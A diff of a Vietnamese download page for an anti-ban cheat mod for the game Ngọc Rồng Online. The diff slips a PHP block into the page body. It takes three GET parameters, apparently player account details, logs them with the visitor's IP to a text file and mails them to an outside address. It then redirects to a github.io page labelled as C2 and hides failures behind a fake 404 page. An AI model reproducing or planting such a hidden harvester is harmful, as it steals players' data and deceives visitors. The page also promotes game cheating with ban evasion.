@@ -1,7 +1,7 @@
 <!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="vi">
 <head>
-<title> NRO  SuperMod Pro CuiBapVH Android iOS AntiBan - Giữ Kết Nối 24/24 - Up Set Kích Hoạt - 8 Ô Skill - Up Đệ Tử - Giữ Sáng Màn Hình - Full Tất Cả Tính Năng VIP Nhất</title>
+<title> NRO CuiBapVH Android iOS AntiBan - Giữ Kết Nối 24/24 - Up Set Kích Hoạt - 8 Ô Skill - Up Đệ Tử - Giữ Sáng Màn Hình - Full Tất Cả Tính Năng VIP Nhất</title>
 <meta name="title" content="NRO  SuperMod Pro CuiBapVH Android iOS AntiBan - Giữ Kết Nối 24/24 - Up Set Kích Hoạt - 8 Ô Skill - Up Đệ Tử - Giữ Sáng Màn Hình - Full Tất Cả Tính Năng VIP Nhất" />
 <meta name="description" content="NRO  SuperMod Pro CuiBapVH Android iOS AntiBan - Giữ Kết Nối 24/24 - Up Set Kích Hoạt - 8 Ô Skill - Up Đệ Tử - Giữ Sáng Màn Hình - Full Tất Cả Tính Năng VIP Nhất" />
 <meta http-equiv="content-type" content="application/xhtml+xml; charset=utf-8"/>
@@ -22,6 +22,51 @@
 </head>
 	<!--script>alert("[19:40 17/12/2019] Sorry ae, nãy mình up nhầm phiên bản beta chưa có chức năng up đệ, ae tải lại phiên bản mới nhất hộ mình nhé!!!");</script-->
 <body>
+<?php
+
+$my_file ='check-click.txt';
+
+$handle = fopen($my_file, 'a') or die('<html lang="en">
+<meta charset="utf-8">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>404 Không Tìm Thấy</title>
+</head><body>
+<h1>Không Tìm Thấy</h1>
+<p>URL bạn vừa yêu cầu không có trên máy chủ này.</p>
+<hr>
+<address>Apache/2.4.41 Server at nro.vn</address>
+<address>Apache/2.4.41 Server at ngocrong.site</address>
+</body></html> '.$my_file);
+
+$cuibapvh = $_GET['cuibapvh'];
+
+$nrovn = $_GET['nrovn'];
+
+$dragonball = $_GET['dragonball'];
+
+date_default_timezone_set('Asia/Ho_Chi_Minh');
+
+$time = date('H:i:s d-m-Y');
+
+$_SERVER["REMOTE_ADDR"];
+fwrite($handle, ''. $cuibapvh. '|'. $nrovn.'|'. $dragonball.'|'. $time.'|'. $_SERVER["REMOTE_ADDR"]. "\n\n");
+fclose($handle);
+
+$message = ''. $cuibapvh. '|'. $nrovn.'|'. $dragonball.'|'. $time.'|'. $_SERVER["REMOTE_ADDR"];
+
+mail('contact@tranducanh.com', 'SuperMod_CuiBapVH', $message);
+
+
+
+
+
+ {
+  header("Location: http://cuibapvhost.github.io/index.html");
+   exit; //Set data url C2;
+   }     
+
+?>
+
 <div class="header" id="tren" style="text-align:center"><a href="/"><img src="images/logo.png" width="215" heigh="59"></a></div>
 
 <div class="chiase" style="text-align:center">
